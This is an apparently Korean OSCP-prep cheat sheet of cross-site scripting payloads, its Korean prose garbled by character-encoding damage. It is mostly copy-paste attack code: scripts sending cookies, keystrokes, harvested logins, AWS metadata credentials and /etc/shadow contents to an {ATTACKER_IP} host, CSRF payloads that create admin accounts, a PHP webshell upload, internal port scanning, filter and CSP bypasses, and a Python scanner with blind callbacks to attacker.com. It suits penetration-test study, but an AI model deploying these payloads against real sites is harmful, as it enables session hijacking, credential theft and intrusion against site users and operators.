# XSS Payloads - OSCP ê³µê²© ê°€ì´ë“œ

> **ëª©í‘œ: XSS ì·¨ì•½ì ì„ í†µí•œ ì •ë³´ ìˆ˜ì§‘ â†’ ì„¸ì…˜ í•˜ì´ì¬í‚¹ â†’ ê´€ë¦¬ì ê¶Œí•œ íšë“**

## âš¡ ê¸°ë³¸ í˜ì´ë¡œë“œë“¤ (ì¦‰ì‹œ ë³µì‚¬-ë¶™ì—¬ë„£ê¸°)

### ğŸš¨ ê¸°ë³¸ XSS íƒì§€

```html
# ê¸°ë³¸ ì•Œë¦¼ì°½ í…ŒìŠ¤íŠ¸
<script>alert('XSS')</script>
<script>alert(1)</script>
<script>confirm('XSS')</script>
<script>prompt('XSS')</script>

# ë‹¤ì–‘í•œ ì´ë²¤íŠ¸ í•¸ë“¤ëŸ¬
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
<keygen onfocus=alert('XSS') autofocus>

# ë§ˆìš°ìŠ¤ ì´ë²¤íŠ¸
<div onmouseover=alert('XSS')>Hover me</div>
<button onclick=alert('XSS')>Click me</button>
<a href="javascript:alert('XSS')">Click me</a>

# íŠ¹ìˆ˜ íƒœê·¸ë“¤
<details open ontoggle=alert('XSS')>
<marquee onstart=alert('XSS')>XSS</marquee>
<video src=x onerror=alert('XSS')>
<audio src=x onerror=alert('XSS')>
```

### ğŸª ì¿ í‚¤ ìŠ¤í‹¸ë§

```html
# ê¸°ë³¸ ì¿ í‚¤ ìŠ¤í‹¸ë§
<script>
  document.location =
    "http://{ATTACKER_IP}:8080/steal?cookie=" + document.cookie;
</script>
<script>
  new Image().src = "http://{ATTACKER_IP}:8080/steal?cookie=" + document.cookie;
</script>
<script>
  fetch("http://{ATTACKER_IP}:8080/steal?cookie=" + document.cookie);
</script>

# XMLHttpRequest í™œìš©
<script>
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "http://{ATTACKER_IP}:8080/steal", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.send("cookie=" + document.cookie);
</script>

# Base64 ì¸ì½”ë”©
<script>
  new Image().src =
    "http://{ATTACKER_IP}:8080/steal?data=" + btoa(document.cookie);
</script>

# ì¿ í‚¤ + í˜ì´ì§€ ì •ë³´
<script>
  var data =
    "cookie=" +
    document.cookie +
    "&url=" +
    window.location.href +
    "&title=" +
    document.title;
  new Image().src = "http://{ATTACKER_IP}:8080/steal?" + data;
</script>
```

### ğŸ”‘ í¬ë ˆë´ì…œ í•˜ë² ìŠ¤íŒ…

```html
# ê°€ì§œ ë¡œê·¸ì¸ í¼ ìƒì„±
<script>
  document.body.innerHTML =
    '<h2>Session Expired</h2><form action="http://{ATTACKER_IP}:8080/login" method="post">Username: <input type="text" name="username"><br>Password: <input type="password" name="password"><br><input type="submit" value="Login"></form>';
</script>

# í˜„ì¬ í¼ í•˜ì´ì¬í‚¹
<script>
  var forms = document.getElementsByTagName("form");
  for (var i = 0; i < forms.length; i++) {
    forms[i].action = "http://{ATTACKER_IP}:8080/harvest";
  }
</script>

# í‚¤ë¡œê±°
<script>
  var keys = "";
  document.onkeypress = function (e) {
    keys += String.fromCharCode(e.which);
    new Image().src =
      "http://{ATTACKER_IP}:8080/keys?data=" + encodeURIComponent(keys);
  };
</script>
```

## ğŸ¯ ìƒí™©ë³„ í˜ì´ë¡œë“œ

### ğŸŒ CSRF ê³µê²© ì—°ê³„

```html
# CSRF - ê´€ë¦¬ì ê³„ì • ìƒì„±
<script>
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "/admin/users", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.send("username=hacker&password=password123&role=admin");
</script>

# CSRF - íŒ¨ìŠ¤ì›Œë“œ ë³€ê²½
<script>
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "/admin/profile", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.send("password=newpassword123");
</script>

# CSRF - ì„¤ì • ë³€ê²½
<script>
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "/admin/settings", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.send("ssh_enabled=true&allow_remote=true");
</script>

# ìˆ¨ê²¨ì§„ CSRF í¼ ìë™ ì œì¶œ
<iframe style="display:none" name="csrf"></iframe>
<form action="/admin/delete" method="POST" target="csrf" id="csrfForm">
  <input type="hidden" name="user" value="admin" />
</form>
<script>
  document.getElementById("csrfForm").submit();
</script>
```

### ğŸ” ë‚´ë¶€ ë„¤íŠ¸ì›Œí¬ ìŠ¤ìºë‹

```html
# ë‚´ë¶€ IP ìŠ¤ìºë‹
<script>
  var ips = [
    "192.168.1.1",
    "192.168.1.10",
    "192.168.1.20",
    "10.0.0.1",
    "172.16.0.1",
  ];
  for (var i = 0; i < ips.length; i++) {
    var img = new Image();
    img.onload = function () {
      new Image().src =
        "http://{ATTACKER_IP}:8080/found?ip=" +
        this.src.split("//")[1].split(":")[0];
    };
    img.src = "http://" + ips[i] + ":80/";
  }
</script>

# í¬íŠ¸ ìŠ¤ìºë‹
<script>
  var target = "192.168.1.10";
  var ports = [
    21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 1433, 3306, 3389, 5432,
  ];
  for (var i = 0; i < ports.length; i++) {
    var xhr = new XMLHttpRequest();
    xhr.timeout = 1000;
    xhr.onreadystatechange = function () {
      if (this.readyState == 4) {
        new Image().src =
          "http://{ATTACKER_IP}:8080/port?target=" +
          target +
          "&port=" +
          this._port +
          "&status=" +
          this.status;
      }
    };
    xhr._port = ports[i];
    xhr.open("GET", "http://" + target + ":" + ports[i], true);
    xhr.send();
  }
</script>

# AWS ë©”íƒ€ë°ì´í„° ì ‘ê·¼
<script>
  var xhr = new XMLHttpRequest();
  xhr.open(
    "GET",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    true
  );
  xhr.onreadystatechange = function () {
    if (this.readyState == 4 && this.status == 200) {
      new Image().src =
        "http://{ATTACKER_IP}:8080/aws?data=" +
        encodeURIComponent(this.responseText);
    }
  };
  xhr.send();
</script>
```

### ğŸ“„ íŒŒì¼ ì½ê¸°/ì“°ê¸° (íŠ¹ìˆ˜ í™˜ê²½)

```html
# Local File Read (file:// í”„ë¡œí† ì½œ í—ˆìš©ì‹œ)
<script>
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "file:///etc/passwd", true);
  xhr.onreadystatechange = function () {
    if (this.readyState == 4) {
      new Image().src =
        "http://{ATTACKER_IP}:8080/file?data=" +
        encodeURIComponent(this.responseText);
    }
  };
  xhr.send();
</script>

# íŒŒì¼ ì—…ë¡œë“œ (ê´€ë¦¬ì íŒ¨ë„ì—ì„œ)
<script>
  var formData = new FormData();
  var blob = new Blob(['<?php system($_GET["cmd"]); ?>'], {
    type: "text/plain",
  });
  formData.append("file", blob, "shell.php");

  var xhr = new XMLHttpRequest();
  xhr.open("POST", "/admin/upload", true);
  xhr.send(formData);
</script>

# ì„¤ì • íŒŒì¼ ì½ê¸°
<script>
  var files = [
    "/etc/passwd",
    "/etc/shadow",
    "/var/www/html/config.php",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
  ];
  for (var i = 0; i < files.length; i++) {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "file://" + files[i], true);
    xhr.onload = function () {
      if (this.responseText) {
        new Image().src =
          "http://{ATTACKER_IP}:8080/files?file=" +
          encodeURIComponent(this._file) +
          "&data=" +
          encodeURIComponent(this.responseText);
      }
    };
    xhr._file = files[i];
    xhr.send();
  }
</script>
```

### ğŸ­ DOM ê¸°ë°˜ XSS

```html
# URL Fragment ê¸°ë°˜
<script>
  if (location.hash) {
    document.write(location.hash.substring(1));
  }
</script>

# JavaScriptì—ì„œ URL íŒŒë¼ë¯¸í„° íŒŒì‹±
<script>
  var params = new URLSearchParams(window.location.search);
  var user = params.get("user");
  document.getElementById("welcome").innerHTML = "Welcome " + user;
</script>

# innerHTML ê¸°ë°˜
<script>
  var content = location.search.substring(1);
  document.getElementById("content").innerHTML = content;
</script>
```

## ğŸ”„ ìš°íšŒ ê¸°ë²•ë“¤

### ğŸ·ï¸ íƒœê·¸ í•„í„° ìš°íšŒ

```html
# script íƒœê·¸ê°€ í•„í„°ë§ë  ë•Œ
<ScRiPt>alert('XSS')</ScRiPt>
<SCRIPT>alert('XSS')</SCRIPT>
<script >alert('XSS')</script>
<script	>alert('XSS')</script>
<script/random>alert('XSS')</script>
<script
>alert('XSS')</script>

# img íƒœê·¸ ë³€í˜•
<IMG SRC=x ONERROR=alert('XSS')>
<img src=x onerror=alert('XSS')>
<img src="x" onerror="alert('XSS')">
<img src='x' onerror='alert(String.fromCharCode(88,83,83))'>
<img/src=x/onerror=alert('XSS')>

# ë‹¤ë¥¸ ì‹¤í–‰ ê°€ëŠ¥ íƒœê·¸ë“¤
<svg/onload=alert('XSS')>
<iframe src=javascript:alert('XSS')>
<embed src=javascript:alert('XSS')>
<object data=javascript:alert('XSS')>
<link rel=import href=javascript:alert('XSS')>
<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
```

### ğŸš« ì´ë²¤íŠ¸ í•¸ë“¤ëŸ¬ í•„í„° ìš°íšŒ

```html
# onerror ë³€í˜• <img src=x onerror=alert('XSS')> <img src=x onError=alert('XSS')>
<img src=x ONERROR=alert('XSS')> <img src=x on error=alert('XSS')> <img src=x
o&#110;error=alert('XSS')> <img src=x on&#101;rror=alert('XSS')> # ë‹¤ë¥¸ ì´ë²¤íŠ¸ë“¤
<body onpageshow=alert('XSS')> <body onbeforeunload=alert('XSS')> <form
onformdata=alert('XSS')> <details ontoggle=alert('XSS') open> <input
onchange=alert('XSS')> # í‚¤ë³´ë“œ ì´ë²¤íŠ¸ <input onkeydown=alert('XSS')> <input
onkeyup=alert('XSS')> <input onkeypress=alert('XSS')>
```

### ğŸ”¤ ë¬¸ìì—´ í•„í„° ìš°íšŒ

```html
# alert í‚¤ì›Œë“œ ìš°íšŒ
<script>
  eval("al" + 'ert("XSS")');
</script>
<script>
  window["al" + "ert"]("XSS");
</script>
<script>
  setTimeout("al" + 'ert("XSS")', 1);
</script>
<script>
  Function("al" + 'ert("XSS")')();
</script>
<script>
  top["al" + "ert"]("XSS");
</script>

# ë¬¸ì ì¸ì½”ë”©
<script>
  alert(String.fromCharCode(88, 83, 83));
</script>
<script>
  eval("\x61\x6c\x65\x72\x74\x28\x22\x58\x53\x53\x22\x29");
</script>
<script>
  eval("\141\154\145\162\164\50\42\130\123\123\42\51");
</script>

# Unicode ìš°íšŒ
<script>
  alert("\u0058\u0053\u0053");
</script>
<script>
  alert("\u0058\u0053\u0053");
</script>

# HTML ì—”í‹°í‹°
<img
  src="x"
  onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;"
/>
<img
  src="x"
  onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;"
/>
```

### ğŸ”’ ì¸ìš©ë¶€í˜¸ í•„í„° ìš°íšŒ

```html
# ì‘ì€ë”°ì˜´í‘œê°€ í•„í„°ë§ë  ë•Œ
<script>
  alert("XSS");
</script>
<script>
  alert(/XSS/.source);
</script>
<script>
  alert(String.fromCharCode(88, 83, 83));
</script>

# í°ë”°ì˜´í‘œê°€ í•„í„°ë§ë  ë•Œ
<script>
  alert("XSS");
</script>
<img src=x onerror=alert(/XSS/)> # ëª¨ë“  ë”°ì˜´í‘œê°€ í•„í„°ë§ë  ë•Œ
<script>
  alert(/XSS/.source);
</script>
<script>
  alert(String.fromCharCode(88, 83, 83));
</script>
<img src="x" onerror="alert(document.domain)" />
<iframe src="javascript:alert(document.domain)">
  # ë°±í‹± ì‚¬ìš©
  <script>
    alert(`XSS`);
  </script>
  <script>
    eval(`alert(\`XSS\`)`);
  </script></iframe
>
```

### ğŸŒ URL ì¸ì½”ë”© ìš°íšŒ

```html
# URL ì¸ì½”ë”© %3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E # ì´ì¤‘ URL ì¸ì½”ë”©
%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E # HTML + URL
ì¡°í•©
%3Cimg%20src%3Dx%20onerror%3D%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%28%27XSS%27%29%3E
```

## ğŸ¤– ìë™í™” ë„êµ¬ ëª…ë ¹ì–´

### ğŸ” XSStrike

```bash
# ê¸°ë³¸ XSS íƒì§€
xsstrike -u "http://{TARGET_IP}/search.php?q=test"

# POST íŒŒë¼ë¯¸í„° í…ŒìŠ¤íŠ¸
xsstrike -u "http://{TARGET_IP}/search.php" --data "q=test"

# íŠ¹ì • íŒŒë¼ë¯¸í„°ë§Œ í…ŒìŠ¤íŠ¸
xsstrike -u "http://{TARGET_IP}/page.php?name=test&id=1" --params name

# ì¿ í‚¤ ê¸°ë°˜ XSS í…ŒìŠ¤íŠ¸
xsstrike -u "http://{TARGET_IP}/page.php" --cookies "session=test"

# í—¤ë” ê¸°ë°˜ XSS í…ŒìŠ¤íŠ¸
xsstrike -u "http://{TARGET_IP}/page.php" --headers "User-Agent: test"

# í¬ë¡¤ë§ê³¼ í•¨ê»˜ í…ŒìŠ¤íŠ¸
xsstrike -u "http://{TARGET_IP}" --crawl

# ë¸”ë¼ì¸ë“œ XSS í…ŒìŠ¤íŠ¸
xsstrike -u "http://{TARGET_IP}/contact.php" --data "message=test" --blind

# WAF ìš°íšŒ ëª¨ë“œ
xsstrike -u "http://{TARGET_IP}/search.php?q=test" --fuzzer
```

### ğŸ•·ï¸ Burp Suite XSS í…ŒìŠ¤íŠ¸

```bash
# 1. Burp Intruder í˜ì´ë¡œë“œ ë¦¬ìŠ¤íŠ¸
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')
"><script>alert('XSS')</script>
'><script>alert('XSS')</script>
</script><script>alert('XSS')</script>

# 2. Burp Extensions
# XSS Validator - ìë™ XSS íƒì§€ ë° ê²€ì¦
# J2EEScan - ë‹¤ì–‘í•œ XSS í˜ì´ë¡œë“œ í…ŒìŠ¤íŠ¸
# Reflected Parameters - ë°˜ì‚¬ëœ íŒŒë¼ë¯¸í„° ìë™ íƒì§€

# 3. Collaborator í™œìš©í•œ Blind XSS
<script>var i=new Image();i.src="http://burpcollaborator.net/?"+document.cookie;</script>
<img src=x onerror=this.src='http://burpcollaborator.net/?'+document.cookie>
```

### ğŸ ì»¤ìŠ¤í…€ XSS ìŠ¤ìºë„ˆ

```python
#!/usr/bin/env python3
import requests
import sys
from urllib.parse import quote

def test_xss(url, param):
    # XSS í˜ì´ë¡œë“œë“¤
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "'\"><script>alert('XSS')</script>",
        "</script><script>alert('XSS')</script>",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>"
    ]

    print(f"[+] Testing XSS on: {url}")

    for payload in payloads:
        try:
            # GET íŒŒë¼ë¯¸í„° í…ŒìŠ¤íŠ¸
            if '?' in url:
                test_url = f"{url}&{param}={quote(payload)}"
            else:
                test_url = f"{url}?{param}={quote(payload)}"

            response = requests.get(test_url, timeout=10)

            # í˜ì´ë¡œë“œê°€ ë°˜ì‚¬ë˜ëŠ”ì§€ í™•ì¸
            if payload in response.text or payload.lower() in response.text.lower():
                print(f"[POTENTIAL] Reflected payload: {payload[:50]}...")

                # ì‹¤ì œ ì‹¤í–‰ ê°€ëŠ¥í•œì§€ ì¶”ê°€ í™•ì¸
                if check_execution(response.text, payload):
                    print(f"[SUCCESS] XSS found: {payload}")
                    return True

        except Exception as e:
            print(f"[-] Error testing {payload[:30]}...: {e}")

    return False

def check_execution(response, payload):
    # ì‹¤í–‰ ê°€ëŠ¥í•œ ì»¨í…ìŠ¤íŠ¸ì¸ì§€ í™•ì¸
    dangerous_contexts = [
        '<script>',
        'onerror=',
        'onload=',
        'javascript:',
        '<iframe',
        '<svg'
    ]

    for context in dangerous_contexts:
        if context in payload.lower() and context in response.lower():
            return True
    return False

def test_blind_xss(url, param, callback_url):
    # Blind XSS í˜ì´ë¡œë“œë“¤
    blind_payloads = [
        f"<script>var i=new Image();i.src='{callback_url}?xss='+document.cookie;</script>",
        f"<img src=x onerror=this.src='{callback_url}?xss='+document.cookie>",
        f"<svg onload=fetch('{callback_url}?xss='+document.cookie)>",
        f"\"><script>location='{callback_url}?xss='+document.cookie</script>"
    ]

    print(f"[+] Testing Blind XSS - Check {callback_url} for callbacks")

    for payload in blind_payloads:
        try:
            data = {param: payload}
            requests.post(url, data=data, timeout=10)
            print(f"[+] Sent blind payload: {payload[:50]}...")
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 xss_test.py <url> <parameter> [callback_url]")
        print("Example: python3 xss_test.py 'http://target.com/search.php' q")
        print("Blind XSS: python3 xss_test.py 'http://target.com/contact.php' message http://attacker.com:8080")
        sys.exit(1)

    url = sys.argv[1]
    param = sys.argv[2]

    # Reflected XSS í…ŒìŠ¤íŠ¸
    if test_xss(url, param):
        print("\n[+] Reflected XSS found! Try manual exploitation.")
    else:
        print("\n[-] No reflected XSS detected.")

    # Blind XSS í…ŒìŠ¤íŠ¸ (callback URL ì œê³µì‹œ)
    if len(sys.argv) == 4:
        test_blind_xss(url, param, sys.argv[3])
```

### ğŸ”§ XSSHunter í™œìš©

```bash
# 1. XSSHunter ì„¸íŒ…
# https://xsshunter.com ê³„ì • ìƒì„±
# ê°œì¸ payload ë„ë©”ì¸ í™•ì¸

# 2. Blind XSS í˜ì´ë¡œë“œ ìƒì„±
<script src=https://js.rip/{YOUR_SUBDOMAIN}></script>
<img src=x onerror=document.location='https://js.rip/{YOUR_SUBDOMAIN}'>
"><script src=https://js.rip/{YOUR_SUBDOMAIN}></script>

# 3. ë‹¤ì–‘í•œ ìœ„ì¹˜ì— ì‚½ì…
# Contact forms, User profiles, Comment sections
# File uploads (filename), HTTP headers
```

## ğŸš¨ ë¬¸ì œ í•´ê²°

### âŒ XSS í˜ì´ë¡œë“œê°€ ì‹¤í–‰ë˜ì§€ ì•Šì„ ë•Œ

```html
# 1. ë‹¤ë¥¸ ì»¨í…ìŠ¤íŠ¸ ì‹œë„
<!-- HTML ì†ì„± ë‚´ë¶€ -->
" onmouseover="alert('XSS')
' onmouseover='alert('XSS')
" onfocus="alert('XSS')" autofocus="

<!-- JavaScript ì»¨í…ìŠ¤íŠ¸ ë‚´ë¶€ -->
';alert('XSS');//
";alert('XSS');//
</script><script>alert('XSS')</script>

<!-- CSS ì»¨í…ìŠ¤íŠ¸ ë‚´ë¶€ -->
</style><script>alert('XSS')</script>
expression(alert('XSS'))

# 2. ì¸ì½”ë”© ì‹œë„
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x31\x29')>

# 3. DOM ê¸°ë°˜ ì ‘ê·¼
<script>document.write('<img src=x onerror=alert(1)>')</script>
<script>document.body.innerHTML+='<img src=x onerror=alert(1)>'</script>
```

### ğŸ” ë°˜ì‚¬ë˜ì§€ ì•ŠëŠ” ê²ƒ ê°™ì„ ë•Œ

```bash
# 1. ë‹¤ë¥¸ íŒŒë¼ë¯¸í„° í™•ì¸
# URL íŒŒë¼ë¯¸í„°, POST ë°ì´í„°, í—¤ë”, ì¿ í‚¤ ëª¨ë‘ í…ŒìŠ¤íŠ¸

# 2. ì§€ì—°ëœ ë°˜ì‚¬ í™•ì¸
# ê´€ë¦¬ì íŒ¨ë„, ë¡œê·¸ í˜ì´ì§€, ì´ë©”ì¼ ë“±ì—ì„œ ë‚˜ì¤‘ì— í‘œì‹œë  ìˆ˜ ìˆìŒ

# 3. ë¶€ë¶„ ë°˜ì‚¬ í™•ì¸
# ì¼ë¶€ ë¬¸ìë§Œ í•„í„°ë§ë˜ì–´ ë¶€ë¶„ì ìœ¼ë¡œ ë°˜ì‚¬ë  ìˆ˜ ìˆìŒ

# 4. Base64 ë””ì½”ë”© í›„ ë°˜ì‚¬
echo "PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=" | base64 -d
# <script>alert('XSS')</script>
```

### ğŸ›¡ï¸ ê°•í•œ í•„í„°ë§ì¼ ë•Œ

```html
# 1. ì´ë²¤íŠ¸ í•¸ë“¤ëŸ¬ ì²´ì´ë‹
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus><option>test</option></select>
<textarea onfocus=alert(1) autofocus>test</textarea>

# 2. ì„œë²„ ì‚¬ì´ë“œ í•„í„° ìš°íšŒ
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src=x onerror=al\u0065rt(1)>

# 3. ë¸Œë¼ìš°ì €ë³„ íŠ¹ì„± í™œìš©
<!-- IEì—ì„œë§Œ ë™ì‘ -->
<img src=x onerror=alert(1)//
<iframe src=vbscript:msgbox(1)>

<!-- Chrome/Firefox -->
<details open ontoggle=alert(1)>
<svg onload=alert(1)>

# 4. CSS ê¸°ë°˜ ê³µê²©
<style>@import'javascript:alert(1)';</style>
<link rel=stylesheet href=javascript:alert(1)>
```

### ğŸ¯ CSP (Content Security Policy) ìš°íšŒ

```html
# 1. í—ˆìš©ëœ ë„ë©”ì¸ í™œìš©
# CSPì—ì„œ í—ˆìš©ëœ ì™¸ë¶€ ë„ë©”ì¸ì´ ìˆë‹¤ë©´ í™œìš©
<script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.min.js></script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>

# 2. ì¸ë¼ì¸ ì´ë²¤íŠ¸ í•¸ë“¤ëŸ¬ (unsafe-inline í—ˆìš©ì‹œ)
<img src=x onerror=alert(1)>

# 3. JSON í•˜ì´ì¬í‚¹
<script>
// JSONP ì½œë°± í™œìš©
function callback(data) {
    alert(document.domain);
}
</script>
<script src="/api/data?callback=callback"></script>

# 4. Base URI í™œìš© (base-uri ì œí•œ ì—†ì„ ë•Œ)
<base href=javascript:alert(1)//>
<a href=test>Click</a>
```

### ğŸ”„ DOM XSS íƒì§€ê°€ ì–´ë ¤ìš¸ ë•Œ

```html
# 1. JavaScript ì†ŒìŠ¤ ë¶„ì„
# ê°œë°œì ë„êµ¬ì—ì„œ DOM ì¡°ì‘ ì½”ë“œ í™•ì¸
document.getElementById('content').innerHTML = userInput;
document.write(userInput);
eval(userInput);

# 2. URL Fragment í™œìš©
# í˜ì´ì§€ì—ì„œ location.hash ì‚¬ìš©í•˜ëŠ”ì§€ í™•ì¸
http://target.com/page.html#<script>alert(1)</script>

# 3. postMessage ì´ë²¤íŠ¸ í™œìš©
<iframe src="target.com/page.html"></iframe>
<script>
frames[0].postMessage('<script>alert(1)</script>','*');
</script>

# 4. Storage ê¸°ë°˜ XSS
localStorage.setItem('user', '<script>alert(1)</script>');
# í˜ì´ì§€ ìƒˆë¡œê³ ì¹¨ í›„ localStorageì—ì„œ ë°ì´í„° ì½ì–´ì™€ ì¶œë ¥ë˜ëŠ”ì§€ í™•ì¸
```

## ğŸ“Š ì„±ê³µ íŒì • ê¸°ì¤€

### âœ… Reflected XSS ì„±ê³µ í™•ì¸

- **ì•Œë¦¼ì°½ ì‹¤í–‰**: `alert()`, `confirm()`, `prompt()` íŒì—… í‘œì‹œ
- **í˜ì´ì§€ ë³€ì¡°**: `document.write()`, `innerHTML` ì¡°ì‘ ì„±ê³µ
- **ë¦¬ë‹¤ì´ë ‰ì…˜**: `location.href` ë³€ê²½ ì„±ê³µ
- **ì½˜ì†” ì¶œë ¥**: `console.log()` ê°œë°œì ë„êµ¬ì—ì„œ í™•ì¸

### âœ… Stored XSS ì„±ê³µ í™•ì¸

- **ì§€ì†ì  ì‹¤í–‰**: í˜ì´ì§€ ìƒˆë¡œê³ ì¹¨ í›„ì—ë„ XSS ì‹¤í–‰
- **ë‹¤ë¥¸ ì‚¬ìš©ì**: ë‹¤ë¥¸ ë¸Œë¼ìš°ì €/ì‹œí¬ë¦¿ ëª¨ë“œì—ì„œë„ ì‹¤í–‰
- **ê´€ë¦¬ì íŒ¨ë„**: ê´€ë¦¬ìê°€ ë³¼ ìˆ˜ ìˆëŠ” ìœ„ì¹˜ì—ì„œ ì‹¤í–‰

### âœ… Blind XSS ì„±ê³µ í™•ì¸

- **HTTP ìš”ì²­**: ê³µê²©ì ì„œë²„ë¡œ ìš”ì²­ ìˆ˜ì‹ 
- **DNS ì¿¼ë¦¬**: DNS ë¡œê·¸ì—ì„œ ìš”ì²­ í™•ì¸
- **ë°ì´í„° ì „ì†¡**: ì¿ í‚¤, ì„¸ì…˜ ì •ë³´ ìˆ˜ì‹ 
- **XSSHunter**: ëŒ€ì‹œë³´ë“œì—ì„œ ì‹¤í–‰ ê¸°ë¡ í™•ì¸

### â° ì‹œê°„ ê´€ë¦¬

- **5ë¶„**: ê¸°ë³¸ reflected XSS í…ŒìŠ¤íŠ¸
- **15ë¶„**: ë‹¤ì–‘í•œ ì»¨í…ìŠ¤íŠ¸ + ìš°íšŒ ê¸°ë²•
- **25ë¶„**: Stored + Blind XSS í…ŒìŠ¤íŠ¸
- **30ë¶„**: DOM XSS + CSP ìš°íšŒ
- **ì‹¤íŒ¨ì‹œ**: ë‹¤ë¥¸ ì›¹ ì·¨ì•½ì ìœ¼ë¡œ ì „í™˜

**ì„±ê³µì‹œ í™œìš© ë°©í–¥**: ì¿ í‚¤ ìŠ¤í‹¸ë§ â†’ ì„¸ì…˜ í•˜ì´ì¬í‚¹ â†’ ê´€ë¦¬ì ê¶Œí•œ â†’ ì‹œìŠ¤í…œ ì ‘ê·¼

## ğŸ’¡ OSCP ì‹¤ì „ í™œìš©

- **ê´€ë¦¬ì ì„¸ì…˜ íƒˆì·¨**: ì¿ í‚¤ ìŠ¤í‹¸ë§ìœ¼ë¡œ ê´€ë¦¬ì ê³„ì • ì ‘ê·¼
- **ë‚´ë¶€ ë„¤íŠ¸ì›Œí¬**: JavaScriptë¡œ ë‚´ë¶€ IP/í¬íŠ¸ ìŠ¤ìºë‹
- **CSRF ì—°ê³„**: ê´€ë¦¬ì ê¶Œí•œìœ¼ë¡œ ê³„ì • ìƒì„±/ì„¤ì • ë³€ê²½
- **íŒŒì¼ ì—…ë¡œë“œ**: ê´€ë¦¬ì ê¶Œí•œìœ¼ë¡œ ì›¹ì‰˜ ì—…ë¡œë“œ
- **ì •ë³´ ìˆ˜ì§‘**: AWS ë©”íƒ€ë°ì´í„°, ë¡œì»¬ íŒŒì¼ ë“± ë¯¼ê°ì •ë³´ ì ‘ê·¼
